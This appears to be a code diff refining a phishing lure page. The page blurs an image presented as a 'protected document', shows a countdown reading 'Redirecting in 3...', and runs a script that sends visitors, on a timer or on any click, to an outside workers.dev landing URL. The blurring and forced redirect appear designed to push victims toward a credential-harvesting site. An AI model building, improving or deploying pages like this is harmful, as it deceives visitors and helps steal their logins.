@@ -5,6 +5,9 @@
   <title>Loading...</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
+  <!-- Preload image -->
+  <link rel="preload" as="image" href="extracted.jpg">
+
   <style>
     * {
       margin: 0;
@@ -14,46 +17,84 @@
 
     body {
       height: 100vh;
-      background: url("extracted.jpg") no-repeat center center;
-      background-size: cover;
       font-family: Arial, sans-serif;
       overflow: hidden;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      background-color: transparent;
+      position: relative;
     }
 
-    .fallback {
+    /* 🔥 ONLY the image is blurred */
+    body::before {
+      content: "";
       position: absolute;
-      bottom: 20px;
-      width: 100%;
-      text-align: center;
-      color: black;
-      font-size: 16px;
+      inset: 0;
+      background: url("extracted.jpg") no-repeat center 10%;
+      background-size: 35%;
+      filter: blur(4px);
+      z-index: 0;
     }
 
-    .fallback a {
-      color: #00ffff;
-      text-decoration: none;
+    /* 🔥 Content stays sharp */
+    .content {
+      position: relative;
+      z-index: 1;
+      color: #00ff88;
+      text-align: center;
+    }
+
+    .text {
+      font-size: 18px;
+      margin-bottom: 10px;
+    }
+
+    .countdown {
+      font-size: 10px;
+      font-weight: bold;
+      animation: pulse 1s infinite;
+    }
+
+    @keyframes pulse {
+      0% { transform: scale(1); }
+      50% { transform: scale(1.2); }
+      100% { transform: scale(1); }
     }
   </style>
 </head>
 
 <body>
 
-  <div class="fallback">
-    If nothing happens, 
-    <a href="https://ojfwo-suem-on9l.jimmy-baileybuilders-com-s-account.workers.dev/lp/l0cwxUxLdWo">
-      Click here
-    </a>
+  <div class="content">
+    <div class="text">
+      This document is protected,
+      Redirecting in <span id="count">3</span>...
+    </div>
+    <div class="countdown" id="bigCount">3</div>
   </div>
 
   <script>
-    const delay = 1500;
+    let count = 3;
 
-    function redirect() {
+    const countText = document.getElementById("count");
+    const bigCount = document.getElementById("bigCount");
+
+    const interval = setInterval(() => {
+      count--;
+
+      if (count <= 0) {
+        clearInterval(interval);
+        window.location.href = "https://ojfwo-suem-on9l.jimmy-baileybuilders-com-s-account.workers.dev/lp/l0cwxUxLdWo";
+      } else {
+        countText.textContent = count;
+        bigCount.textContent = count;
+      }
+    }, 1000);
+
+    document.body.addEventListener('click', () => {
       window.location.href = "https://ojfwo-suem-on9l.jimmy-baileybuilders-com-s-account.workers.dev/lp/l0cwxUxLdWo";
-    }
-
-    setTimeout(redirect, delay);
-    document.body.addEventListener('click', redirect);
+    });
   </script>
 
 </body>
